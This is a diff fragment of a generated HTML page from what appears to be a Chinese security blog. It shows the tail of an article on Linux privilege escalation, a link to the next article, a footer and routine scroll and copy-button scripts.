+</span></span><span style="display:flex;"><span>而 SUID 不需要此前提
+</span></span></code></pre></div></section>
+
+  
+  
+  <div class="paginator">
+    
+    
+    <a class="next" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux/1.%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/"><span>内核溢出漏洞提权</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://www.hzhsec.top/">Hzhsec home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
